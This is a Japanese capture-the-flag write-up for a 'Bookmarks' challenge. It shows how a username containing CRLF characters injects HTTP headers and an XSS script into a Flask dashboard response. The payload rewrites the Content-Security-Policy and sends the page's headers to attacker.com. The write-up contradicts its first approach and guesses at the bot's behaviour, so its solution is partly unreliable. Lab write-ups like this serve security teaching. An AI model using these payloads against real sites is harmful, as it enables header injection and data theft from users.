# Bookmarks - Solution

## 脆弱性

この問題には**CRLF Injection**の脆弱性があります。

### 問題のコード

`/dashboard`ルートで、ユーザー名がHTTPヘッダーに直接埋め込まれています：

```python
response.headers['X-User-' + username] = user_id
```

ユーザー名に`\r\n`（改行）を含めることで、任意のHTTPヘッダーを注入できます。

## 攻撃の流れ

1. **CRLF Injectionでヘッダーを注入**
   - ユーザー名に`\r\n`を含めてアカウントを作成
   - `Content-Security-Policy`ヘッダーを上書きしてインラインスクリプトを許可
   - HTTPレスポンスボディにJavaScriptを注入

2. **XSS経由でFlagを窃取**
   - BotはFlagをユーザー名として登録
   - Botが悪意のあるダッシュボードページにアクセス
   - 注入されたJavaScriptが実行される
   - Botのダッシュボードには`X-User-{FLAG}`ヘッダーが含まれる
   - JavaScriptでこのヘッダーまたはページ内容を外部サーバーに送信

## ペイロード例

```python
malicious_username = (
    "test\r\n"
    "Content-Security-Policy: default-src *; script-src 'unsafe-inline'\r\n"
    "Content-Type: text/html\r\n"
    "\r\n"
    "<script>"
    "fetch('/dashboard').then(r=>{"
    "  let headers='';"
    "  for(let h of r.headers.entries())"
    "    headers+=h[0]+':'+h[1]+'\\n';"
    "  fetch('https://attacker.com?data='+btoa(headers));"
    "});"
    "</script>"
)
```

## 重要なポイント

- Botは最初にユーザーが指定したURLを訪問してから、自分のアカウントでログイン
- しかしBotのセッションで`/dashboard`にアクセスすると、`X-User-{FLAG}`ヘッダーが設定される
- CRLF Injectionで作成したユーザーでログインし、そのダッシュボードURLをBotに送信する方法では、BotのFlagは取得できない
- **正しいアプローチ**: BotがFLAGユーザー名で登録後、自分の`/dashboard`にアクセスした時にXSSが発火するようにする必要がある

## 解法の修正

実際には、BotがFLAGユーザーとして登録した後、そのBotが他のユーザーのダッシュボードページ（CRLF Injectionで作成）にアクセスするようにトリガーする必要があります。

または、Botの動作を見ると：
1. ユーザーが指定したURLに訪問
2. FLAG名でアカウント登録・ログイン
3. 何か"admin stuff"を実行

この"admin stuff"の部分で、おそらく全ユーザーのダッシュボードをクロールするか、特定のページにアクセスする可能性があります。

### 代替アプローチ

CRLFでレスポンスを完全に制御し、Botが訪問した際にそのページ自体がXSSを含むようにする：

```python
# Register with CRLF payload
username = "test\r\nContent-Type: text/html\r\n\r\n<script>/* XSS here */</script>"
# Then make bot visit http://web/dashboard
```

これにより、BotがダッシュボードURLを訪問した際、注入されたHTMLが返され、XSSが発火します。
